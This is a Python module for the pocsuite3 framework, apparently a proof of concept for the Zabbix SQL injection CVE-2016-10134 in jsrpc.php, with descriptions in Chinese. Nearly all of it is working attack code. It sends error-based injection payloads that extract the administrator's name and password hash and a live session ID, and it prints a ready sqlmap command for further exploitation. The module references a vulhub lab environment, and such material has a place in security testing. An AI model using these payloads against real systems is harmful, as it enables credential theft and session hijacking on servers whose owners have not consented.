import os, base64
from collections import OrderedDict
import re

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger
from pocsuite3.lib.utils import random_str

class DemoPOC(POCBase):
    vulID = 'CVE-2016-10134'  # ssvid
    version = '1.0'
    author = ['cz']
    vulDate = '2019-11-19'
    createDate = '2019-11-19'
    updateDate = '2019-11-19'
    references = ['https://vulhub.org/#/environments/zabbix/CVE-2016-10134/']
    name = 'Zabbix Sqli'
    appPowerLink = ''
    appName = 'Zabbix'
    appVersion = '<=2.2.13 3.x-3.0.3'
    vulType = 'SQL Injection'
    desc = '''Zabbix2.2.14之前的版本和3.0.4之前的3.0版本中存在SQL注入漏洞。远程攻击者可借助latest.php文件中的‘toggle_ids’数组参数利用该漏洞执行任意SQL命令。'''
    samples = []
    install_requires = ['']
    pocDesc = '该POC只提供Sql注入，返回管理员密码（cmd5解密），并给出sqlmap参数'
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

    def _options(self):
        o = OrderedDict()
        return o

    def _verify(self):
        result = {}

        payload = 'type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)'
        resp = requests.get(self.url + 'jsrpc.php', params=payload)
        try:
            if resp.status_code == 200 and 'Error in query' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Postdata'] = payload
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)

    def _attack(self):
        result = {}

        sql = 'select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(alias,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a'
        payload = 'type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=({})'.format(sql)
        resp = requests.get(self.url + 'jsrpc.php', params=payload)
        adminNamePwdHash = re.search(r"Duplicate\s*entry\s*'~(.+?)~1", resp.text, re.S).group(1)

        sql = 'select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a'
        payload = 'type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=({})'.format(sql)
        resp = requests.get(self.url + 'jsrpc.php', params=payload)
        sessionid = re.search(r"Duplicate\s*entry\s*'~(.+?)~1", resp.text, re.S).group(1)
        try:
            if resp.status_code == 200 and 'Duplicate' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Postdata'] = payload
                result['extra'] = {}
                result['extra']['Username'] = adminNamePwdHash.split(':')[0]
                result['extra']['Password'] = adminNamePwdHash.split(':')[1]
                result['extra']['sessionID'] = sessionid
                result['extra']['sqlmap'] = 'sqlmap.py -u ' + self.url + 'jsrpc.php' + 'type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=() ' + '-p profileIdx2'
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)
    
register_poc(DemoPOC)
